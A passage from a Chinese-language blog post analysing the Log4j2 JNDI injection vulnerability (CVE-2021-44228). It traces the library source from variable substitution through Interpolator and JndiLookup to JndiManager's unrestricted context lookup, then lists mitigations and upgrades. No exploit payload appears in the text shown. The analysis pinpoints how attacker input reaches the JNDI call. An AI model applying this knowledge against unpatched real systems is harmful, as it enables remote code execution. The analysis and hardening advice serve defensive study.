<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Internal method that resolves the value of a variable.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Most users of this class do not need to call this method. This method is</span></span><br><span class="line"><span class="comment"> * called automatically by the substitution process.</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Writers of subclasses can override this method if they need to alter</span></span><br><span class="line"><span class="comment"> * how each substitution occurs. The method is passed the variable&#x27;s name</span></span><br><span class="line"><span class="comment"> * and must return the corresponding value. This implementation uses the</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> #getVariableResolver()&#125; with the variable&#x27;s name as the key.</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> event The LogEvent, if there is one.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> variableName  the name of the variable, not null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> buf  the buffer where the substitution is occurring, not null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> startPos  the start position of the variable including the prefix, valid</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> endPos  the end position of the variable including the suffix, valid</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the variable&#x27;s value or &lt;b&gt;null&lt;/b&gt; if the variable is unknown</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> String <span class="title function_">resolveVariable</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String variableName, <span class="keyword">final</span> StringBuilder buf,</span></span><br><span class="line"><span class="params">                                 <span class="keyword">final</span> <span class="type">int</span> startPos, <span class="keyword">final</span> <span class="type">int</span> endPos)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">resolver</span> <span class="operator">=</span> getVariableResolver();</span><br><span class="line">    <span class="keyword">if</span> (resolver == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resolver.lookup(event, variableName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在resolveVariable方法中调用到了Interpolator#lookup方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Resolves the specified variable. This implementation will try to extract</span></span><br><span class="line"><span class="comment"> * a variable prefix from the given variable name (the first colon (&#x27;:&#x27;) is</span></span><br><span class="line"><span class="comment"> * used as prefix separator). It then passes the name of the variable with</span></span><br><span class="line"><span class="comment"> * the prefix stripped to the lookup object registered for this prefix. If</span></span><br><span class="line"><span class="comment"> * no prefix can be found or if the associated lookup object cannot resolve</span></span><br><span class="line"><span class="comment"> * this variable, the default lookup object will be used.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> event The current LogEvent or null.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> var the name of the variable whose value is to be looked up</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the value of this variable or &lt;b&gt;null&lt;/b&gt; if it cannot be</span></span><br><span class="line"><span class="comment"> * resolved</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> LogEvent event, String <span class="keyword">var</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">var</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">prefixPos</span> <span class="operator">=</span> <span class="keyword">var</span>.indexOf(PREFIX_SEPARATOR);</span><br><span class="line">    <span class="keyword">if</span> (prefixPos &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">prefix</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(<span class="number">0</span>, prefixPos).toLowerCase(Locale.US);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">lookup</span> <span class="operator">=</span> strLookupMap.get(prefix);</span><br><span class="line">        <span class="keyword">if</span> (lookup <span class="keyword">instanceof</span> ConfigurationAware) &#123;</span><br><span class="line">            ((ConfigurationAware) lookup).setConfiguration(configuration);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (lookup != <span class="literal">null</span>) &#123;</span><br><span class="line">            value = event == <span class="literal">null</span> ? lookup.lookup(name) : lookup.lookup(event, name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> = <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (defaultLookup != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> event == <span class="literal">null</span> ? defaultLookup.lookup(<span class="keyword">var</span>) : defaultLookup.lookup(event, <span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/12.png"></p>
<p>lookup方法中完成变量的解析并返回，如上图所示，已将sys:user.name解析成系统用户名。</p>
<h3 id="字符串查询"><a href="#字符串查询" class="headerlink" title="字符串查询"></a>字符串查询</h3><p>如上lookup方法所属的类Interpolator主要用于代理多个StrLookup实例，它提供统一的字符串查找功能。</p>
<p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/13.png"></p>
<p>PREFIX_SEPARATOR是前缀分隔符，默认是一个冒号。</p>
<p>在使用Interpolator(java.util.Map&lt;java.lang.String,java.lang.String&gt;)构造方法实例化该类时，会创建并注册多个内置的StrLookup实例到strLookupMap中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creates the Interpolator using only Lookups that work without an event and initial properties.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Interpolator</span><span class="params">(<span class="keyword">final</span> Map&lt;String, String&gt; properties)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.defaultLookup = <span class="keyword">new</span> <span class="title class_">MapLookup</span>(properties == <span class="literal">null</span> ? <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;() : properties);</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> this ought to use the PluginManager</span></span><br><span class="line">    strLookupMap.put(<span class="string">&quot;log4j&quot;</span>, <span class="keyword">new</span> <span class="title class_">Log4jLookup</span>());</span><br><span class="line">    strLookupMap.put(<span class="string">&quot;sys&quot;</span>, <span class="keyword">new</span> <span class="title class_">SystemPropertiesLookup</span>());</span><br><span class="line">    strLookupMap.put(<span class="string">&quot;env&quot;</span>, <span class="keyword">new</span> <span class="title class_">EnvironmentLookup</span>());</span><br><span class="line">    strLookupMap.put(<span class="string">&quot;main&quot;</span>, MainMapLookup.MAIN_SINGLETON);</span><br><span class="line">    strLookupMap.put(<span class="string">&quot;marker&quot;</span>, <span class="keyword">new</span> <span class="title class_">MarkerLookup</span>());</span><br><span class="line">    strLookupMap.put(<span class="string">&quot;java&quot;</span>, <span class="keyword">new</span> <span class="title class_">JavaLookup</span>());</span><br><span class="line">    strLookupMap.put(<span class="string">&quot;lower&quot;</span>, <span class="keyword">new</span> <span class="title class_">LowerLookup</span>());</span><br><span class="line">    strLookupMap.put(<span class="string">&quot;upper&quot;</span>, <span class="keyword">new</span> <span class="title class_">UpperLookup</span>());</span><br><span class="line">    <span class="comment">// JNDI</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// [LOG4J2-703] We might be on Android</span></span><br><span class="line">        strLookupMap.put(LOOKUP_KEY_JNDI,</span><br><span class="line">            Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.core.lookup.JndiLookup&quot;</span>, StrLookup.class));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> LinkageError | Exception e) &#123;</span><br><span class="line">        handleError(LOOKUP_KEY_JNDI, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// JMX input args</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// We might be on Android</span></span><br><span class="line">        strLookupMap.put(LOOKUP_KEY_JVMRUNARGS,</span><br><span class="line">            Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.core.lookup.JmxRuntimeInputArgumentsLookup&quot;</span>,</span><br><span class="line">                    StrLookup.class));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> LinkageError | Exception e) &#123;</span><br><span class="line">        handleError(LOOKUP_KEY_JVMRUNARGS, e);</span><br><span class="line">    &#125;</span><br><span class="line">    strLookupMap.put(<span class="string">&quot;date&quot;</span>, <span class="keyword">new</span> <span class="title class_">DateLookup</span>());</span><br><span class="line">    strLookupMap.put(<span class="string">&quot;ctx&quot;</span>, <span class="keyword">new</span> <span class="title class_">ContextMapLookup</span>());</span><br><span class="line">    <span class="keyword">if</span> (Constants.IS_WEB_APP) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            strLookupMap.put(LOOKUP_KEY_WEB,</span><br><span class="line">                Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.web.WebLookup&quot;</span>, StrLookup.class));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception ignored) &#123;</span><br><span class="line">            handleError(LOOKUP_KEY_WEB, ignored);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        LOGGER.debug(<span class="string">&quot;Not in a ServletContext environment, thus not loading WebLookup plugin.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        strLookupMap.put(LOOKUP_KEY_DOCKER,</span><br><span class="line">            Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.docker.DockerLookup&quot;</span>, StrLookup.class));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception ignored) &#123;</span><br><span class="line">        handleError(LOOKUP_KEY_DOCKER, ignored);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        strLookupMap.put(LOOKUP_KEY_SPRING,</span><br><span class="line">                Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.spring.cloud.config.client.SpringLookup&quot;</span>, StrLookup.class));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception ignored) &#123;</span><br><span class="line">        handleError(LOOKUP_KEY_SPRING, ignored);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        strLookupMap.put(LOOKUP_KEY_KUBERNETES,</span><br><span class="line">                Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.kubernetes.KubernetesLookup&quot;</span>, StrLookup.class));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception | NoClassDefFoundError error) &#123;</span><br><span class="line">        handleError(LOOKUP_KEY_KUBERNETES, error);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例如上面的sys:user.name，所对应的就是SystemPropertiesLookup。不光如此，还有jndi类型的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LOOKUP_KEY_JNDI</span> <span class="operator">=</span> <span class="string">&quot;jndi&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// JNDI</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// [LOG4J2-703] We might be on Android</span></span><br><span class="line">    strLookupMap.put(LOOKUP_KEY_JNDI,</span><br><span class="line">        Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.core.lookup.JndiLookup&quot;</span>, StrLookup.class));</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">final</span> LinkageError | Exception e) &#123;</span><br><span class="line">    handleError(LOOKUP_KEY_JNDI, e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当日志消息中包含jndi关键词时，消息便会交由org.apache.logging.log4j.core.lookup.JndiLookup进行查询。</p>
<p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/14.png"></p>
<p>在JndiLookup#lookup方法中，用到了jndiManager.lookup方法来对一个jndiName进行查询。</p>
<p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/15.png"></p>
<h3 id="JNDI查询"><a href="#JNDI查询" class="headerlink" title="JNDI查询"></a>JNDI查询</h3><p>org.apache.logging.log4j.core.net.JndiManager是Log4j2中用于管理JNDI上下文的类。</p>
<p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/16.png"></p>
<p>在JndiLookup#lookup方法中调用了JndiManager的getDefaultManager方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">JndiManager</span> <span class="variable">jndiManager</span> <span class="operator">=</span> JndiManager.getDefaultManager()</span><br></pre></td></tr></table></figure>

<p>在getDefaultManager会调用内部类JndiManagerFactory创建JndiManager实例，在其中创建了一个InitialContext，作为JndiManager对象的成员变量context。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">JndiManagerFactory</span> <span class="variable">FACTORY</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JndiManagerFactory</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Context context;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">JndiManager</span><span class="params">(<span class="keyword">final</span> String name, <span class="keyword">final</span> Context context)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(<span class="literal">null</span>, name);</span><br><span class="line">    <span class="built_in">this</span>.context = context;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets the default JndiManager using the default &#123;<span class="doctag">@link</span> javax.naming.InitialContext&#125;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the default JndiManager</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JndiManager <span class="title function_">getDefaultManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getManager(JndiManager.class.getName(), FACTORY, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">JndiManagerFactory</span> <span class="keyword">implements</span> <span class="title class_">ManagerFactory</span>&lt;JndiManager, Properties&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> JndiManager <span class="title function_">createManager</span><span class="params">(<span class="keyword">final</span> String name, <span class="keyword">final</span> Properties data)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JndiManager</span>(name, <span class="keyword">new</span> <span class="title class_">InitialContext</span>(data));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> NamingException e) &#123;</span><br><span class="line">            LOGGER.error(<span class="string">&quot;Error creating JNDI InitialContext.&quot;</span>, e);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在JndiManager#lookup方法中，则调用了this.context.lookup方法进行无限制的JDNI查询，此处便是导致JDNI攻击的最终触发点。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Looks up a named object through this JNDI context.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> name name of the object to look up.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &lt;T&gt;  the type of the object.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the named object if it could be located.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  NamingException if a naming exception is encountered</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> String name)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">return</span> (T) <span class="built_in">this</span>.context.lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h2><h3 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h3><ul>
<li>关闭字符串解析查询功能，在配置文件中设置log4j2.formatMsgNoLookups为True。</li>
<li>禁用JDNI功能，或升级Java版本至6u211、7u201、8u191、11.0.1以防御JNDI注入攻击。不过依旧会受到带外信息泄漏的影响。</li>
<li>限制受影响应用访问外部互联网。</li>
</ul>
<h3 id="版本升级"><a href="#版本升级" class="headerlink" title="版本升级"></a>版本升级</h3><p>升级Log4j2至2.15.0版本，可一劳永逸。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://0xf4n9x.github.io">_0xf4n9x_</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://0xf4n9x.github.io/cve-2021-44228-log4j2-jndi-attack.html">https://0xf4n9x.github.io/cve-2021-44228-log4j2-jndi-attack.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。未经许可禁止转载到微信公众号，其他转载请注明来自 <a href="https://0xf4n9x.github.io" target="_blank">_0xf4n9x_'s Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/cve/">cve</a><a class="post-meta__tags" href="/tags/java/">java</a><a class="post-meta__tags" href="/tags/rce/">rce</a><a class="post-meta__tags" href="/tags/log4j/">log4j</a><a class="post-meta__tags" href="/tags/jndi/">jndi</a></div><div class="post_share"><div class="social-share" data-image="/img/post/cve-2021-44228-log4j2-jndi-attack/0.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/jspxcms-code-audit-learn.html" title="Jspxcms审计记录"><img class="cover" src="/img/post/jspxcms-code-audit-learn/3.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Jspxcms审计记录</div></div></a></div><div class="next-post pull-right"><a href="/pentest-for-campus-server.html" title="针对校园某服务器的一次渗透测试"><img class="cover" src="/img/post/pentest-for-campus-server/rdesktop.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">针对校园某服务器的一次渗透测试</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/apache-ofbiz-cve-2023-49070-xmlrpc-rce.html" title="CVE-2023-49070 Apache OFBiz XMLRPC RCE漏洞分析"><img class="cover" src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/burp.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-07</div><div class="title">CVE-2023-49070 Apache OFBiz XMLRPC RCE漏洞分析</div></div></a></div><div><a href="/cve-2016-4437-apache-shiro-rce.html" title="CVE-2016-4437 SHIRO-550反序列化漏洞"><img class="cover" src="/img/post/cve-2016-4437-apache-shiro-rce/9.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-21</div><div class="title">CVE-2016-4437 SHIRO-550反序列化漏洞</div></div></a></div><div><a href="/cve-2023-32315-openfire-auth-bypass.html" title="CVE-2023-32315 Openfire管理控制台认证绕过漏洞分析"><img class="cover" src="/img/post/openfire-cve-2023-32315-auth-bypass/openfire.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-14</div><div class="title">CVE-2023-32315 Openfire管理控制台认证绕过漏洞分析</div></div></a></div><div><a href="/attacking-shiro-with-tomcat-memshell.html" title="利用Tomcat内存马攻击Shiro应用"><img class="cover" src="/img/post/attacking-shiro-with-tomcat-memshell/4.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-20</div><div class="title">利用Tomcat内存马攻击Shiro应用</div></div></a></div><div><a href="/apache-shiro-deserialization-exploitation.html" title="Apache Shiro各版本反序列化漏洞利用"><img class="cover" src="/img/post/apache-shiro-deserialization-exploitation/2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-22</div><div class="title">Apache Shiro各版本反序列化漏洞利用</div></div></a></div><div><a href="/attacking-shiro550-with-commons-collections.html" title="利用Commons Collections攻击Shiro550"><img class="cover" src="/img/post/attacking-shiro550-with-commons-collections/17.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-22</div><div class="title">利用Commons Collections攻击Shiro550</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="toc-text">漏洞触发点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B6%88%E6%81%AF%E6%A0%BC%E5%BC%8F%E5%8C%96"><span class="toc-text">消息格式化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2"><span class="toc-text">字符替换</span></a></li><li class="toc-item toc-level-3"><a 